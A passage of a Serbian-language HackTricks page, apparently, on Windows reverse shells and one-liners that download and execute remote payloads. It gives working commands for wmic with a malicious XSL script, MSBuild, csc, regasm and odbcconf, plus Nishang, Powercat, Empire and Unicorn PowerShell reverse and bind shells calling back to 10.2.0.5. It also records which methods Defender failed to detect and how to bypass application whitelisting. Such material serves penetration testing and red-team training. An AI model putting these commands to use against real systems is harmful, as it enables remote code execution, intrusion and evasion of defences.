* [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Primer xsl fajla [odavde](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Nije otkriveno**

**Možete veoma lako preuzeti i izvršiti Koadic zombi koristeći stager wmic**

## Msbuild

* [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Možete koristiti ovu tehniku da zaobiđete belu listu aplikacija i ograničenja Powershell.exe. Kada pokrenete ovaj fajl, bićete upitani za PS shell.\
Samo preuzmite i izvršite ovaj fajl: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Nije otkriveno**

## **CSC**

Kompajlirajte C# kod na žrtvinoj mašini.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Možete preuzeti osnovnu C# reverznu ljusku sa ove lokacije: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Nije otkriveno**

## **Regasm/Regsvc**

* [Sa ove lokacije](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Nisam probao**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf

* [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Nisam probao**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell Shell-ovi

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

U **Shells** folderu, nalazi se mnogo različitih shell-ova. Da biste preuzeli i izvršili Invoke-_PowerShellTcp.ps1_, napravite kopiju skripte i dodajte na kraj fajla:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Započnite sa izvršavanjem skripte na veb serveru i izvršite je na kraju žrtve:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender ne prepoznaje ovo kao zlonamjerni kod (još uvijek, 3/04/2019).

**TODO: Provjeriti druge nishang shell-ove**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Preuzmite, pokrenite web server, pokrenite slušatelja i izvršite ga na žrtvinom računalu:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender jo ga ne detektuje kao zlonamerni kod (još uvek, 3/04/2019).

**Druga opcija koju nudi powercat:**

Bind shell, Reverse shell (TCP, UDP, DNS), Port preusmeravanje, upload/download, Generisanje payload-a, Slanje fajlova...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Kreirajte powershell pokretač, sačuvajte ga u datoteku i preuzmite i izvršite ga.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Detektovan kao zlonamerni kod**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Kreiraj powershell verziju metasploit backdoor-a koristeći unicorn
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Pokrenite msfconsole sa kreiranim resursom:
```
msfconsole -r unicorn.rc
```
Započnite veb server koji će služiti datoteku _powershell\_attack.txt_ i izvršite na žrtvi:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Detektovan kao zlonamerni kod**

## Više

[PS>Attack](https://github.com/jaredhaight/PSAttack) PS konzola sa nekim ofanzivnim PS modulima unapred učitanim (šifrovano)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) PS konzola sa nekim ofanzivnim PS modulima i detekcijom proksi (IEX)

## Reference

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretrage pretnji, pronalazi probleme u celokupnom tehnološkom skupu, od API-ja do veb aplikacija i sistemima u oblaku. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
